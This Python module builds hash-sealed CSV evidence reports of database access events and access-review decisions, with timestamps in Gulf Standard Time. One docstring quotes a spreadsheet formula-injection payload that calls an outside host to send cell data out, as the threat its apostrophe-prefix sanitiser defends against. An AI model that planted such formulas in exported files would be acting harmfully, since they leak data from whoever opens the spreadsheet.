"""Audit report generation. Tamper-evident (spec 5): the SHA-256 is computed
once, over the exact bytes written to disk, at generation time -- a report
can be re-verified later but never silently edited and still pass as the
original. All timestamps are stored internally as UTC; the export converts
them to Gulf Standard Time (Asia/Dubai, UTC+4, no DST) since that is what
GCC regulators reference, while still labeling the column as local time
explicitly rather than leaving it ambiguous.
"""
import csv
import hashlib
import io
from datetime import datetime, timedelta, timezone
from uuid import UUID

from sqlalchemy import select
from sqlalchemy.orm import Session

from app.models.access_event import AccessEvent
from app.models.access_review import AccessReviewItem
from app.models.violation import Violation

GST = timezone(timedelta(hours=4))

# Leading characters a spreadsheet treats as the start of a formula rather
# than text. See _sanitize_cell.
_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def _to_gst(dt: datetime) -> str:
    return dt.astimezone(GST).strftime("%Y-%m-%d %H:%M:%S GST")


def _sanitize_cell(value: object) -> object:
    """Neutralise spreadsheet formula injection in exported evidence.

    Almost every field in these reports is attacker-influenceable: actor
    identifiers, schema/table names and grantee names all come from the
    *monitored* database, where anyone able to create a role or a table
    controls the string. Excel and LibreOffice execute a cell beginning
    with = + - @ as a formula on open, so a role named
    `=HYPERLINK("http://x/"&A1)` turns the auditor's own act of opening the
    evidence file into data exfiltration.

    Prefixing with an apostrophe is the standard mitigation: spreadsheets
    render it as literal text, and the value is preserved verbatim for any
    non-spreadsheet consumer that strips it. Applied at the single
    choke-point every row passes through, so a new column can't forget it.
    """
    if not isinstance(value, str) or not value:
        return value
    if value.startswith(_FORMULA_PREFIXES):
        return "'" + value
    return value


def _write_row(writer, row: list) -> None:
    writer.writerow([_sanitize_cell(cell) for cell in row])


def _finalize_csv(buffer: io.StringIO) -> tuple[str, str]:
    """Returns (content, sha256_hex). The hash is computed over the exact
    UTF-8 bytes that get stored, so re-verification later compares like
    with like."""
    content = buffer.getvalue()
    content_sha256 = hashlib.sha256(content.encode("utf-8")).hexdigest()
    return content, content_sha256


def generate_report_csv(db: Session, workspace_id: UUID, range_start: datetime, range_end: datetime) -> tuple[str, str]:
    """Returns (content, sha256_hex)."""
    events = db.scalars(
        select(AccessEvent)
        .where(
            AccessEvent.workspace_id == workspace_id,
            AccessEvent.occurred_at >= range_start,
            AccessEvent.occurred_at <= range_end,
        )
        .order_by(AccessEvent.occurred_at)
    ).all()

    violations_by_event = {
        v.access_event_id: v
        for v in db.scalars(select(Violation).where(Violation.workspace_id == workspace_id))
    }

    buffer = io.StringIO()
    writer = csv.writer(buffer)
    writer.writerow(
        [
            "occurred_at_utc",
            "occurred_at_gst",
            "actor_identifier",
            "actor_type",
            "query_type",
            "schema_name",
            "table_name",
            "source_ip",
            "source_region",
            "region_confidence",
            "region_source",
            "violation_flagged",
            "violation_reason",
        ]
    )
    for e in events:
        violation = violations_by_event.get(e.id)
        _write_row(
            writer,
            [
                e.occurred_at.astimezone(timezone.utc).isoformat(),
                _to_gst(e.occurred_at),
                e.actor_identifier,
                e.actor_type,
                e.query_type,
                e.schema_name_snapshot or "",
                e.table_name_snapshot or "",
                e.source_ip or "",
                e.source_region or "unknown",
                e.region_confidence,
                e.region_source or "",
                "yes" if violation else "no",
                violation.reason if violation else "",
            ],
        )

    return _finalize_csv(buffer)


def generate_access_review_report_csv(db: Session, workspace_id: UUID, cycle_id: UUID) -> tuple[str, str]:
    """Evidence export for one access review cycle, shaped the way a SOC 2
    Type II / ISO 27001 auditor expects to see it: who was reviewed, what
    they had access to, who decided, what they decided, and when -- not a
    raw log dump. Reviewer name/date/decision is the auditor-facing
    artifact this whole workflow exists to produce."""
    from app.models.user import User  # local import to avoid a cycle with app.models.__init__ ordering

    items = db.scalars(
        select(AccessReviewItem)
        .where(AccessReviewItem.workspace_id == workspace_id, AccessReviewItem.cycle_id == cycle_id)
        .order_by(AccessReviewItem.table_name_snapshot, AccessReviewItem.actor_identifier)
    ).all()

    users_by_id = {u.id: u for u in db.scalars(select(User).where(User.workspace_id == workspace_id))}

    buffer = io.StringIO()
    writer = csv.writer(buffer)
    writer.writerow(
        [
            "table",
            "classification",
            "actor",
            "actor_type",
            "access_basis",
            "owner",
            "access_count_in_window",
            "first_seen_gst",
            "last_seen_gst",
            "decision",
            "decision_reason",
            "reviewed_by",
            "reviewer_authorized_at_time_of_decision",
            "reviewed_at_gst",
        ]
    )
    for item in items:
        owner = users_by_id.get(item.owner_user_id)
        reviewer = users_by_id.get(item.reviewed_by_user_id)
        _write_row(
            writer,
            [
                f"{item.schema_name_snapshot}.{item.table_name_snapshot}",
                item.classification_tags_snapshot,
                item.actor_identifier,
                item.actor_type,
                item.access_basis,
                owner.email if owner else ("unattributed service account" if item.actor_type == "service_account" else ""),
                item.access_count,
                _to_gst(item.first_seen_at) if item.first_seen_at else "",
                _to_gst(item.last_seen_at) if item.last_seen_at else "",
                item.decision,
                item.decision_reason or "",
                reviewer.email if reviewer else "",
                "yes" if item.reviewer_authorized_snapshot else ("no" if item.reviewer_authorized_snapshot is False else ""),
                _to_gst(item.reviewed_at) if item.reviewed_at else "",
            ],
        )

    return _finalize_csv(buffer)


def verify_report_integrity(content: str, expected_sha256: str) -> bool:
    """Re-hash the stored content and compare against the hash recorded at
    generation time. Compared with compare_digest: the comparison itself
    shouldn't leak, via timing, how much of a forged hash was correct."""
    import hmac

    actual = hashlib.sha256(content.encode("utf-8")).hexdigest()
    return hmac.compare_digest(actual, expected_sha256)
